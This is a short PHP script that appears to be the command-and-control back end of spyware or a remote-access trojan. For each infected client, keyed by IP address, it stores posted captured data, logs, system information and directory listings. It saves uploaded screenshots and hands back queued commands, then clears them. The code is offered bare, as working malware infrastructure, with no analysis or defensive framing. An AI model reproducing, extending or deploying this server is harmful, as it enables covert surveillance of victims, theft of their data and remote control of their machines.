<?php

$ip = $_SERVER['REMOTE_ADDR'];

$file_data = 'data/' . $ip;
$file_log  = 'log/' . $ip;
$file_cmds = 'commands/' . $ip;
$file_info = 'info/' . $ip;
$file_ls = 'ls/' . $ip;

$file_screenshots = 'screenshots/' . $ip;

if (isset($_POST['d'])) {
	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);

	echo file_get_contents($file_cmds);
	file_put_contents($file_cmds, '');
}
else if (isset($_POST['l'])) {
	file_put_contents($file_log,
		file_get_contents($file_log)
		. "[" . date("F d Y H:i:s", time())
		. "] " . $_POST['l'] . "\n");
}
else if (isset($_POST['i'])) {
	file_put_contents($file_info, $_POST['i']);
}
else if (isset($_POST['x'])) {
	file_put_contents($file_ls, $_POST['x']);
}
else if (isset($_FILES['s'])) {
	$uploadfile = $file_screenshots . '-' . time();
	move_uploaded_file($_FILES['s']['tmp_name'], $uploadfile);
}

?>